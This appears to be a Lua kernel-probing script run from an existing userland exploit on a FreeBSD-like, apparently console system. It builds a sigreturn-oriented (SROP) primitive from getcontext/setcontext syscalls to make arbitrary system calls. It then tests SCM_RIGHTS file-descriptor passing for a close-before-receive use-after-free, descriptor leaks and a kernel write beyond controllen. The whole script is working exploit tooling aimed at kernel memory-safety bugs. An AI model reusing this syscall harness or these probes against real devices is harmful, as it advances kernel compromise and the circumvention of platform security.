-- CRASH_CLASS: MODERATE
-- PROBE 151c: SCM_RIGHTS close-before-receive UAF test
--
-- 151b showed: MSG_PEEK doesn't deliver cmsg, controllen=0 silently
-- drops cmsg with no CTRUNC flag. The fd ref handling is suspect.
--
-- Tests:
-- [A] Send fd via SCM_RIGHTS, close original, then receive (classic UAF)
-- [B] Send fd, close both pipe ends + sending socket, then receive
-- [C] Repeated controllen=0 drops — check for fd leak via /dev/null opens
-- [D] PEEK then close sender then recv — stale cmsg in buffer?
-- [E] Write overflow check — place sentinel after cmsg buffer, recv, check

print("=== PROBE 151c: CLOSE RACE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

local function send_scm(sock, fd, mh_off, byte)
    local iv = mh_off + 0x100
    local cm = mh_off + 0x200
    local io = mh_off + 0x300
    wd(gpu + io, byte)
    wq(gpu + iv, ga(io))
    wq(gpu + iv + 8, uint64(1))
    for off = 0, 31, 4 do wd(gpu + cm + off, 0) end
    wd(gpu + cm, 20)
    wd(gpu + cm + 4, 0xFFFF)
    wd(gpu + cm + 8, 1)
    wd(gpu + cm + 16, fd)
    wq(gpu + mh_off, uint64(0))
    wd(gpu + mh_off + 8, 0)
    wq(gpu + mh_off + 0x10, ga(iv))
    wd(gpu + mh_off + 0x18, 1)
    wq(gpu + mh_off + 0x20, ga(cm))
    wd(gpu + mh_off + 0x28, 24)
    wd(gpu + mh_off + 0x30, 0)
    return srop(28, uint64(sock), ga(mh_off), uint64(0))
end

local function recv_scm(sock, ctl, flags, mh_off)
    local iv = mh_off + 0x100
    local cm = mh_off + 0x200
    local io = mh_off + 0x300
    wq(gpu + io, uint64(0))
    wq(gpu + iv, ga(io))
    wq(gpu + iv + 8, uint64(64))
    for off = 0, 63, 4 do wd(gpu + cm + off, 0xDEADDEAD) end
    wq(gpu + mh_off, uint64(0))
    wd(gpu + mh_off + 8, 0)
    wq(gpu + mh_off + 0x10, ga(iv))
    wd(gpu + mh_off + 0x18, 1)
    wq(gpu + mh_off + 0x20, ga(cm))
    wd(gpu + mh_off + 0x28, ctl)
    wd(gpu + mh_off + 0x30, 0)
    local r = srop(27, uint64(sock), ga(mh_off), uint64(flags))
    local rv = r and to_num(r) or -1
    local cmsg_len = to_num(memory.read_dword(gpu + cm))
    local fd_at16 = to_num(memory.read_dword(gpu + cm + 16))
    local mflags = to_num(memory.read_dword(gpu + mh_off + 0x30))
    return rv, cmsg_len, fd_at16, mflags
end

-- [A] Close original fd after send, before receive
print("--- [A] CLOSE BEFORE RECV ---")
local sv = gpu + 0x1000
wq(sv, uint64(0))
local sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    -- Create a pipe
    local prd_r = srop(42)
    local prd = prd_r and to_num(prd_r) or -1
    local pwr = prd + 1
    print("pipe=" .. prd .. "," .. pwr)

    if prd >= 0 then
        -- Send pipe read fd
        send_scm(s0, prd, 0x2000, 0x41)
        print("sent_fd=" .. prd)

        -- Close BOTH pipe ends before receiving
        srop(6, uint64(prd))
        srop(6, uint64(pwr))
        print("closed originals")

        -- Receive — kernel should have kept a reference
        local rv, cl, fd, fl = recv_scm(s1, 64, 0, 0x3000)
        print("recv=" .. rv .. " cmsg_len=" .. cl .. " fd=" .. fd .. " flags=0x" .. string.format("%X", fl))

        if fd > 0 and fd < 256 and fd ~= 0xDEADDEAD then
            print("*** GOT FD AFTER CLOSE: " .. fd .. " ***")

            -- Try to use the received fd — is it a valid pipe?
            -- fcntl(fd, F_GETFL) = syscall 92 with cmd 3
            local fl_r = srop(92, uint64(fd), uint64(3))
            print("fcntl_getfl=" .. (fl_r and tostring(to_num(fl_r)) or "nil"))

            -- Try read from it (should fail since write end closed)
            local rbuf = gpu + 0x4000
            wq(rbuf, uint64(0))
            -- Set non-blocking first
            srop(92, uint64(fd), uint64(4), uint64(4))
            local rr = srop(3, uint64(fd), ga(0x4000), uint64(8))
            local rrv = rr and to_num(rr) or -1
            print("read_closed_pipe=" .. rrv)

            -- fstat via sys 551
            local sbuf = gpu + 0x5000
            for off = 0, 0x7F, 4 do wd(sbuf + off, 0) end
            local fs = srop(551, uint64(fd), ga(0x5000))
            print("fstat=" .. (fs and tostring(to_num(fs)) or "nil"))

            -- Dump first 32 bytes of fstat
            if fs and to_num(fs) == 0 then
                for off = 0, 28, 4 do
                    local v = to_num(memory.read_dword(sbuf + off))
                    if v ~= 0 then
                        print("  stat+" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v))
                    end
                end
            end

            srop(6, uint64(fd))
        end
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [B] Close sender socket too (force buffer cleanup)
print("")
print("--- [B] CLOSE ALL ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    local prd_r = srop(42)
    local prd = prd_r and to_num(prd_r) or -1
    if prd >= 0 then
        send_scm(s0, prd, 0x6000, 0x42)
        srop(6, uint64(prd))
        srop(6, uint64(prd + 1))
        srop(6, uint64(s0)) -- close sender!
        print("closed_all_senders")

        local rv, cl, fd, fl = recv_scm(s1, 64, 0, 0x7000)
        print("recv=" .. rv .. " cmsg_len=" .. cl .. " fd=" .. fd .. " flags=0x" .. string.format("%X", fl))

        if fd > 0 and fd < 256 and fd ~= 0xDEADDEAD then
            print("*** GOT FD AFTER SENDER CLOSE: " .. fd .. " ***")
            srop(6, uint64(fd))
        end
    end
    srop(6, uint64(s1))
end

-- [C] Controllen=0 fd leak test
print("")
print("--- [C] FD LEAK ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    -- Send 10 fds with controllen=0 receive (all dropped)
    for i = 1, 10 do
        local pr = srop(42)
        local pv = pr and to_num(pr) or -1
        if pv >= 0 then
            send_scm(s0, pv, 0x8000, 0x43 + i)
            srop(6, uint64(pv))
            srop(6, uint64(pv + 1))

            -- Receive with controllen=0 (drop cmsg)
            local rmh = gpu + 0x9000
            wq(gpu + 0x9300, uint64(0))
            wq(gpu + 0x9100, ga(0x9300))
            wq(gpu + 0x9100 + 8, uint64(64))
            wq(rmh, uint64(0))
            wd(rmh + 8, 0)
            wq(rmh + 0x10, ga(0x9100))
            wd(rmh + 0x18, 1)
            wq(rmh + 0x20, ga(0x9200))
            wd(rmh + 0x28, 0)
            wd(rmh + 0x30, 0)
            srop(27, uint64(s1), ga(0x9000), uint64(0))
        end
    end

    -- Now check highest fd by opening something
    local nm = gpu + 0xA000
    wd(nm, 0x6B6C2F) -- "/lk"
    wd(nm + 4, 0x00003031)
    local leak_fd = srop(482, ga(0xA000), uint64(0x0202), uint64(0x1B6))
    local lv = leak_fd and to_num(leak_fd) or -1
    print("after_leak_fd=" .. lv)
    -- If fds are leaked, the next fd number will be higher
    if lv >= 0 then
        srop(6, uint64(lv))
        srop(483, ga(0xA000))
    end

    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

-- [D] Write overflow check
print("")
print("--- [D] OVERFLOW ---")
wq(sv, uint64(0))
sp = srop(135, uint64(1), uint64(1), uint64(0), ga(0x1000))
if sp and to_num(sp) == 0 then
    local s0 = to_num(memory.read_dword(sv))
    local s1 = to_num(memory.read_dword(sv + 4))

    local pr = srop(42)
    local pv = pr and to_num(pr) or -1
    if pv >= 0 then
        send_scm(s0, pv, 0xB000, 0x50)

        -- Place cmsg buffer at known location with sentinels AFTER it
        local cmbase = gpu + 0xC000
        -- Fill with pattern: 4 bytes cmsg area, then sentinel
        for off = 0, 63, 4 do wd(cmbase + off, 0xAAAAAAAA) end
        -- Put sentinel values at +4..+64
        for off = 4, 63, 4 do wd(cmbase + off, 0xFEEDFACE) end

        -- Receive with controllen=4 (way too small for 20-byte cmsg)
        local rmh = gpu + 0xC100
        wq(gpu + 0xC300, uint64(0))
        wq(gpu + 0xC200, ga(0xC300))
        wq(gpu + 0xC200 + 8, uint64(64))

        wq(rmh, uint64(0))
        wd(rmh + 8, 0)
        wq(rmh + 0x10, ga(0xC200))
        wd(rmh + 0x18, 1)
        wq(rmh + 0x20, ga(0xC000)) -- cmsg at cmbase
        wd(rmh + 0x28, 4) -- only 4 bytes
        wd(rmh + 0x30, 0)

        srop(27, uint64(s1), ga(0xC100), uint64(0))

        -- Check if kernel wrote beyond 4 bytes
        local overflow = false
        for off = 0, 31, 4 do
            local v = to_num(memory.read_dword(cmbase + off))
            local expected = 0xFEEDFACE
            if off == 0 then expected = 0xAAAAAAAA end
            if v ~= expected then
                print("  +" .. string.format("%02X", off) .. "=0x" .. string.format("%08X", v) .. " (was 0x" .. string.format("%08X", expected) .. ")")
                if off >= 4 then overflow = true end
            end
        end
        if overflow then
            print("*** KERNEL WROTE BEYOND CONTROLLEN ***")
        else
            print("no overflow detected")
        end

        srop(6, uint64(pv))
        srop(6, uint64(pv + 1))
    end
    srop(6, uint64(s0))
    srop(6, uint64(s1))
end

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
